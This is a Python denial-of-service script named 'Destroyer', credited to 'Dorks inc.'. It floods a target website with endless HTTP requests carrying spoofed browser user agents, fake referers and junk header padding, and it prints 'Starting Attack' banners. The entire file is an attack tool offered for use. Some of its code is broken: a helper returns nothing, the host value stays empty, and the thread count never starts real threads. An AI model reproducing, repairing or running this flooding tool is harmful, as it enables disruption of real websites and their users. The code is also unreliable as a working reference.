##################################
#
# Destroyer - Https DoS
#
# This DoS can destroy a
# website in matters of
# seconds
#
# Authur - Dorks inc.
#
##################################

import urllib.request
import random
import sys
import threading

#global prams
target_url=''
host=''
threads=0
useragent=[]
referer=[]
req_count=0

def usage():
	print("[USAGE] GetHttps.py")
	print(f"{sys.argv[0]} <target_url> <threads>")
	exit()

def inc_counter():
	global req_count
	req_count+=1

if len(sys.argv) > 3 or len(sys.argv) < 3:
	usage()

def useragent_list():
	useragent.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	useragent.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	useragent.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	useragent.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	useragent.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	useragent.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	useragent.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	useragent.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	useragent.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	useragent.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	useragent.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	useragent.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')

def referer_list():
	global headers_referers
	referer.append('http://www.google.com/?q=')
	referer.append('http://www.usatoday.com/search/results?q=')
	referer.append('http://engadget.search.aol.com/search?q=')
	referer.append('http://' + host + '/')

#builds random ascii string
def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += str(a)

target_url+=sys.argv[1]

char='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*()'

def httpcall():

	useragent_list()
	referer_list()


	request = urllib.request.Request(target_url)
	request.add_header('User-Agent', random.choice(useragent))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(referer) + str(buildblock(random.randint(5,10))))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('data', random.choice(list(char))*random.randint(10,1000))
	request.add_header('Host',host)
	try:
			urllib.request.urlopen(request)
	#except urllib.error.ConnectionError as e:
	#		print(e)
	#		print('Flooding WebSite Port 80/443/8080/5000 with 65000-byte packets for 99999')
	#except urllib.error.URLError as e:
	#		print(e)
	#		sys.exit()
	except Exception as e:
		print(e)
	else:
			inc_counter()
			urllib.request.urlopen(request)



def ForeverRun():
	while True:
		httpcall()
threads+=int(sys.argv[2])
def run():
	for i in range(threads):
		ForeverRun()

if __name__=='__main__':
	print("[+]Starting Attack")
	print("[+]Sending Bytes of data to target")
	print("[*]We are anonymous except us")
	print("------------------------------------")
	run()
